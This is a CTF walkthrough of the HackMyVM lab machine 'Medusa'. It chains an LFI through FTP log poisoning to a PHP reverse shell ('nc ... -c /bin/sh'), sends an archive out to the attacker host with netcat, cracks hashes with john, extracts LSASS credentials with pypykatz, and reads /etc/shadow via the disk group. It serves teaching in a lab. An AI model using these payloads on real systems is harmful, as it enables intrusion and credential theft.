---
title: CTF Walkthrough for HackMyVM Machine Medusa
category: [Walkthrough, CTF]
tags: [hackmyvm, writeup, medusa, machines, pentest]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-12-medusa/box-medusa.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Medusa a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Medusa<br>
Goal: Get two flags<br>
Operating System: Linux<br>
Download link: [Medusa](https://downloads.hackmyvm.eu/medusa.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance
Since this machine displays its IP address on startup, we will directly start with a service scan to identify services running on opened ports.
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Service]
└─$sudo nmap -n -sV -sC 10.0.2.6 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 06:12 BST
Nmap scan report for 10.0.2.6
Host is up (0.00022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:69:80:99 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
```
Our target has FTP, SSH and Apache web services running. FTP appears to have anonymous login disable so let's browse to the web application to see what it looks like.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-12-medusa/1-browse.png){: .center}

We can see that this web application has the standard Apache index.html default page. Let's fuzz this web application to uncover hidden files or directories.
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Web]
└─$ffuf -ic -c -u http://10.0.2.6/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php
<SNIP>

manual                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1ms]
                        [Status: 200, Size: 10674, Words: 3423, Lines: 369, Duration: 4ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 6ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 0ms]
hades                   [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 9ms]
:: Progress: [2547638/2547638] :: Job [1/1] :: 6060 req/sec :: Duration: [0:06:40] :: Errors: 0 ::
```

The fuzzing process reveals a directory name **hades** when we visit this directory it appears to load a blank page. Let's fuzz this directory once more.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-12-medusa/2-browse.png){: .center}
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Web]
└─$ffuf -ic -c -u http://10.0.2.6/hades/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php

<SNIP>

index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 839ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 846ms]
door.php                [Status: 200, Size: 555, Words: 63, Lines: 19, Duration: 42ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 8ms]

:: Progress: [2547638/2547638] :: Job [1/1] :: 6250 req/sec :: Duration: [0:06:49] :: Errors: 0 ::
```
From our last fuzzing, we can see a new page under the hade directory named door.php. This page appears to send a magic word to the d00r_validation.php page for validation. From the html code of door.php, we can see that this magic word is a text and has a maximum length of 6 character.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-12-medusa/3-browse.png){: .center}

![](/assets/img/posts/walthrough/hackmyvm/2024-09-12-medusa/door-test-1.png){: .center}

```html
 <form action="d00r_validation.php" method="POST">
    <label for="word">Please enter the magic word...</label>
    <input id="word" type="text" required maxlength="6" name="word">
    <input type="submit" value="submit">
 </form>
```
We can create a custom wordlist with words having  a maximum length of 6 characters and use it to fuzz the web page.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$grep -E '^.{,6}$'  -r --no-filename /usr/share/seclists/Usernames/* | sort -u > custom-list.txt

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Medusa/Misc Files]
└─$ffuf -ic -c -u http://10.0.2.6/hades/d00r_validation.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'word=FUZZ' -w ./custom-list.txt -fs 123                                                                                                                   
<SNIP>

Kraken                  [Status: 200, Size: 138, Words: 11, Lines: 6, Duration: 16ms]
:: Progress: [1404189/1404189] :: Job [1/1] :: 3278 req/sec :: Duration: [0:07:29] :: Errors: 0 :: 
```

When we enter this magic word it reveals the domain of the machine.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl -s  http://10.0.2.6/hades/d00r_validation.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'word=Kraken'  | html2text
medusa.hmv
```
We can add this domain to our /etc/hosts file.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$echo "10.0.2.6\tmedusa.hmv" | sudo tee -a /etc/hosts                          
10.0.2.6        medusa.hmv
```

With this domain, we can fuzz for the presence of Vhosts on the target.
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Service]
└─$ffuf -ic -c -u http://10.0.2.6 -H 'Host:FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3423

<SNIP>

dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 2255ms]
:: Progress: [114437/114437] :: Job [1/1] :: 1709 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
```
We successfully found that a Vhost was running on the target, let's add this to our /etc/hosts file and visit the website.
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Service]
└─$echo "10.0.2.6\tdev.medusa.hmv" | sudo tee -a /etc/hosts
10.0.2.6        dev.medusa.hmv
```

![](/assets/img/posts/walthrough/hackmyvm/2024-09-12-medusa/4-browse.png){: .center}

This appears to be a historical page. Let's fuzz this vhost to discover any hidden file or directory.
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Service]                                                                                   09:22:11 [67/5351]
└─$ffuf -ic -c -u http://dev.medusa.hmv/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -e .php,.txt,.html                   

<SNIP>

files                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 6ms]                                                                                                                                            
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]                                                                                                                                         
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 6ms]                                                                        
manual                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 19ms]                                                                       
index.html              [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 1004ms]
robots.txt              [Status: 200, Size: 489, Words: 239, Lines: 16, Duration: 14ms]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms]
                        [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 6ms]

:: Progress: [350604/350604] :: Job [1/1] :: 4166 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```
We see many outputs from our fuzzing, let's analyse them one by one. When we visit the **assets** and **css** directories, they have directory listing enabled so there is no need for further fuzzing. The robots.txt file doesn't contain anything interesting. The **files** directory seems blank, this may be because the index page is loaded when it is visited so it's ward fuzzing.
```bash
┌──(pentester㉿kali)-[~/Medusa/Scans/Service]
└─$ffuf -ic -c -u http://dev.medusa.hmv/files/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -e .php,.txt,.html

<SNIP>

index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
system.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
readme.txt              [Status: 200, Size: 144, Words: 10, Lines: 4, Duration: 27ms]

:: Progress: [350604/350604] :: Job [1/1] :: 9090 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```
The **system.php** file discovered above look interesting. We can try to parameter fuzzing to see if this file processes any user input.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ffuf -ic -c -u http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

<SNIP>

view                    [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 13ms]
:: Progress: [6453/6453] :: Job [1/1] :: 2325 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
*NB: When fuzzing parameter's name you should try various type of input because some parameters may cause in the response only when some specific values are used. Your main objective will be to test if payloads used to exploit different vulnerabilities such as LFI, Command injection, and SQLi  work on the website*.
We can make a raw request with this parameter and observer the response.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl http://dev.medusa.hmv/files/system.php?view=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<SNIP>
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```
## Exploitation

It seems that the parameter **view** used by the system.php file is vulnerable to local file inclusion. Since the web server uses PHP language we can utilise PHP wrappers to extend the LFI vulnerability. First, we need to understand the nature of the LFI i.e. which PHP function is used to include files. We can do this by reading the content of the system.php file using the convert.base64-encode PHP wrapper. 
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl http://dev.medusa.hmv/files/system.php?view=php://filter/read=convert.base64-encode/resource=system.php
PD9waHAKCiRmaWxlID0gJF9HRVRbJ3ZpZXcnXTsKaWYoaXNzZXQoJGZpbGUpKQoKewoKaW5jbHVkZSgiJGZpbGUiKTsKCn0KCmVsc2UKCnsKCmluY2x1ZGUoImluZGV4LnBocCIpOwoKfQo/Pgo=
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl -s http://dev.medusa.hmv/files/system.php?view=php://filter/read=convert.base64-encode/resource=system.php | base64 -d
<?php
$file = $_GET['view'];
if(isset($file))
{
include("$file");
}
else
{
include("index.php");
}
?>
```
Since the is no filter we have to bypass we can directly fuzz for common files in the linux environment.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Medusa/Misc Files]
└─$ffuf -ic -c -u http://dev.medusa.hmv/files/system.php?view=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -fs 0 

<SNIP>
/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 16ms]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 19ms]
/etc/fstab              [Status: 200, Size: 806, Words: 180, Lines: 16, Duration: 23ms]
/etc/group              [Status: 200, Size: 758, Words: 1, Lines: 55, Duration: 31ms]
/etc/hosts              [Status: 200, Size: 190, Words: 19, Lines: 8, Duration: 37ms]
/etc/issue              [Status: 200, Size: 79, Words: 11, Lines: 7, Duration: 18ms]
/etc/motd               [Status: 200, Size: 286, Words: 36, Lines: 8, Duration: 17ms]
/etc/passwd             [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 20ms]
/etc/vsftpd.conf        [Status: 200, Size: 5850, Words: 806, Lines: 156, Duration: 19ms]
/etc/ssh/sshd_config    [Status: 200, Size: 3333, Words: 296, Lines: 127, Duration: 25ms]
/proc/cmdline           [Status: 200, Size: 97, Words: 4, Lines: 2, Duration: 20ms]
/proc/self/cmdline      [Status: 200, Size: 27, Words: 1, Lines: 1, Duration: 20ms]
/proc/self/stat         [Status: 200, Size: 320, Words: 52, Lines: 2, Duration: 16ms]
/proc/self/status       [Status: 200, Size: 1337, Words: 91, Lines: 57, Duration: 15ms]
/proc/version           [Status: 200, Size: 185, Words: 21, Lines: 2, Duration: 16ms]
/var/log/lastlog        [Status: 200, Size: 292292, Words: 1, Lines: 1, Duration: 24ms]
/var/log/wtmp           [Status: 200, Size: 44928, Words: 10, Lines: 18, Duration: 26ms]
/var/run/utmp           [Status: 200, Size: 1152, Words: 1, Lines: 2, Duration: 14ms]
/var/log/vsftpd.log     [Status: 200, Size: 493320, Words: 63948, Lines: 6092, Duration: 118ms]
:: Progress: [1155/1155] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
From the result above, we can read the FTP server's log. Remember that the PHP function used in the system.php file is include(), this function executes the file it reads. Since we can control the content of the FTP server log i.e. our username, we can place a PHP code at the place of the username and execute it when we include the file. First let's verify that we can control the content of the log file
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ftp 10.0.2.6                                                                                                                                          
Connected to 10.0.2.6.
220 (vsFTPd 3.0.3)
Name (10.0.2.6:pentester): I CONTROL LOGS
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl -s http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log                

<SNIP>

Thu Sep 12 05:45:48 2024 [pid 17132] CONNECT: Client "::ffff:10.0.2.15"
Thu Sep 12 05:46:01 2024 [pid 17131] [I CONTROL LOGS] FAIL LOGIN: Client "::ffff:10.0.2.15"
```
We can see that the username 'I CONTROL LOGS' is present in the log file. Now let's input PHP code as our username.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ftp 10.0.2.6       
Connected to 10.0.2.6.
220 (vsFTPd 3.0.3)
Name (10.0.2.6:pentester): <?php system("id"); ?>
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl -s http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log 

<SNIP>

Thu Sep 12 05:46:01 2024 [pid 17131] [I CONTROL LOGS] FAIL LOGIN: Client "::ffff:10.0.2.15"
Thu Sep 12 05:48:18 2024 [pid 17160] CONNECT: Client "::ffff:10.0.2.15"
Thu Sep 12 05:48:49 2024 [pid 17159] [uid=33(www-data) gid=33(www-data) groups=33(www-data)
] FAIL LOGIN: Client "::ffff:10.0.2.15"
```
The code is executed and returns the user's ID when the file is included. This confirms remote code execution. Now let's place a reverse shell as our username and start a listener to catch the shell.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ftp 10.0.2.6
Connected to 10.0.2.6.
220 (vsFTPd 3.0.3)
Name (10.0.2.6:pentester): <?php system("nc 10.0.2.15 4444 -c /bin/sh"); ?>
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp>

┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$nc -lvnp 4444
listening on [any] 4444 ...
```
Finally we can include the log file. This will execute the payload and send us a reverse connection.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$curl -s http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log

<SNIP>

Thu Sep 12 05:48:49 2024 [pid 17159] [uid=33(www-data) gid=33(www-data) groups=33(www-data)
] FAIL LOGIN: Client "::ffff:10.0.2.15"
```
We can now check our listener that will indicate to us that we have received a shell.
```bash
┌──(pentester㉿kali)-[~/Medusa/]
└─$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.6] 40854
whoami
www-data
```

We can start enumerating the target. We can see that the is an uncommon  directory named **...** in the root directory of the file system.
```bash
cd / 
ls -la
total 72
drwxr-xr-x  19 root root  4096 Jan 15  2023 .
drwxr-xr-x  19 root root  4096 Jan 15  2023 ..
drwxr-xr-x   2 root root  4096 Jan 18  2023 ...
lrwxrwxrwx   1 root root     7 Jan 15  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jan 15  2023 boot
drwxr-xr-x  17 root root  3140 Sep 12 06:45 dev

<SNIP>
```

When we access this directory, we will see an old archive file that belongs to the www-data user.
```bash
cd ...
ls -l
total 12100
-rw------- 1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```
We can transfer this file to our attack host for further analyses. We can do this by starting a Netcat listener on our attack host and pushing the file from the target to our listener using Netcat.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$nc -lvnp 8000 > old_files.zip
listening on [any] 8000 ...
```

```bash
nc -q 0 10.0.2.15 8000 < old_files.zip
```

```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$nc -lvnp 8000 > old_files.zip
listening on [any] 8000 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.6] 43866

┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ls
custom-list.txt old_files.zip
```
This file appears to be password protected. Hence, we can't extract it without having the password.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─└─$7z e old_files.zip 

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=C.UTF-8 Threads:2 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

Enter password (will not be echoed):
ERROR: Wrong password : lsass.DMP

<SNIP>
```
We can use zip2john to extract the password hash from the zip file. This password hash can then be cracked using John the Ripper.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ zip2john old_files.zip > hashes.txt

┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ john hashes.txt -wordlist:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 12386830 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
medusa666        (old_files.zip/lsass.DMP)     
1g 0:00:02:51 DONE (2024-09-12 17:38) 0.005835g/s 33031p/s 33031c/s 33031C/s meeker75..medabe15
Use the "--show" option to display all of the cracked passwords reliably
Session completed.  
```
With this password, we can decompress the zip file.
```bash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$7z e old_files.zip

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=C.UTF-8 Threads:2 OPEN_MAX:1024

<SNIP> 

? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

Enter password (will not be echoed):
Everything is Ok

Size:       34804383
Compressed: 12387024

┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$ls
custom-list.txt  hashes.txt  lsass.DMP  old_files.zip
```
The extracted file seems to be an LSASS dump file. The Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. When the memory of this process is dumped, the dumped file can be use to extract the credentials of all logged in users.  Also, when WDigest authentication is activated there is a possibility of reading passwords in plain text from the LSASS process memory. We can extract credentials from this dump file using **pypykatz**.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Medusa/Misc Files]                      
└─$pypykatz lsa minidump lsass.DMP                                               
INFO:pypykatz:Parsing file lsass.DMP                                                      
FILE: ======== lsass.DMP =======                                                 
== LogonSession ==                                                               
authentication_id 2261421 (2281ad)                                        
session_id 18                                                                                           
<SNIP> 

logon_time 2023-01-17T13:56:09.715430+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1004
luid 845877
        == MSV ==
                Username: spectre
                Domain: Medusa-PC
                LM: NA
                NT: 6ec779920e220c163f33101085eff0b9
                SHA1: 4d3341113c66127df14de8cc6ac7b4ebf52d74b5
                DPAPI: NA
        == WDIGEST [ce835]==
                username spectre
                domainname Medusa-PC
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
        == Kerberos ==
                Username: spectre
                Domain: Medusa-PC
                Password: 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
        == WDIGEST [ce835]==
                username spectre
                domainname Medusa-PC
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
        == TSPKG [ce835]==
                username spectre
                domainname Medusa-PC
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
<SNIP>
```
From the above output, We can confirm that WDigest  was activated on the Windows machine LSASS's memory was dumped. This allows us to see the clear text password of the user spectre. This user is also a local user on our target, so let's use these credentials to log in and read the flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Medusa/Misc Files]
└─$ssh spectre@10.0.2.6
spectre@10.0.2.6's password: 
Linux medusa 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
<SNIP>

permitted by applicable law.
Last login: Sat Jan 21 14:57:30 2023 from 192.168.1.13
spectre@medusa:~$ ls
user.txt
```

## Post Exploitation

Now that we have logged in, we can continue our enumeration process on the target. A quick way to escalate privileges is to leverage group membership. A quick look at Spectre's group membership shows that spectre is a member of the disk group. The disk group gives the user access to any block devices contained within /dev/. We can leverage this to access the root file system and read the /etc/shadow file to crack the root's password.
```bash
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            471M     0  471M   0% /dev
tmpfs            98M  508K   98M   1% /run
/dev/sda1       6.9G  6.5G     0 100% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000
spectre@medusa:~$ /usr/sbin/debugfs /dev/sda1                            
debugfs 1.46.2 (28-Feb-2021)                                              
debugfs:  mkdir test              
mkdir: Filesystem opened read/only                                               
debugfs:  cat /etc/shadow                  
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::                
<SNIP>

spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
debugfs: q
spectre@medusa:~$
```
Next, we can copy the root's password hash and attempt to crack it using john.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Medusa/Misc Files]
└─$echo '$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2' > root.hash
┌──(pentester㉿kali)-[~/Medusa/Misc Files]
└─$john root.hash -wordlist:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [0:unknown 1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt 7:scrypt 10:yescrypt 11:gost-yescrypt]) is 10 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
andromeda        (?)     
1g 0:00:00:19 DONE (2024-09-12 20:38) 0.05023g/s 188.0p/s 188.0c/s 188.0C/s 19871987..street
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
From the result above, we successfully cracked the root's hash. We can use this password to log in as the root user and read the root flag.
```bash
spectre@medusa:~$ su root
Password: 
root@medusa:/home/spectre# ls -la /root
total 28
drwx------  3 root root 4096 Jan 30  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
lrwxrwxrwx  1 root root    9 Jan 15  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 Jan 17  2023 .bashrc
drwxr-xr-x  3 root root 4096 Jan 15  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   53 Jan 18  2023 .rO0t.txt
-rw-r--r--  1 root root   66 Jan 30  2023 .selected_editor
```
## Conclusion
Congratulations! In this walkthrough, you’ve successfully exploited a local file inclusion vulnerability in a web application to achieve remote code execution on the target system. Through thorough enumeration, you uncovered an old, password-protected backup file containing an LSASS dump. After successfully cracking the password hash of this archive, you extracted the credentials from the LSASS dump. Using these credentials, you logged in and utilized your disk group membership to access the shadow file and crack the root password. This machine was designed to enhance your enumeration skills and deepen your understanding of attack chains. Thank you for following up on this walkthrough.
